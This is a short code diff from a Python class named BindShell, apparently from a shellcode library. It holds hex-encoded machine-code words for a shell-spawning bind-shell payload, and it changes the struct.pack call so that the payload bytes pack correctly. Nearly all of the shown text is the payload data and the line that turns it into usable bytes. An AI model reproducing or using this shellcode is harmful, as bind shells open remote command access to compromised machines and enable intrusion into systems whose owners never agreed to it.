@@ -53,5 +53,5 @@ class BindShell (Static):
         0x078b5007,0xc0315050,0x80cd3bb0,0x5151c931,0x01b0c031,0xd8e880cd,0x2fffffff,
         0x2f6e6962,0x90416873
     )
-    bytes = struct.pack("<" + ("L" * len(longs)), longs)
+    bytes = struct.pack("<" + ("L" * len(longs)), *longs)
     del longs
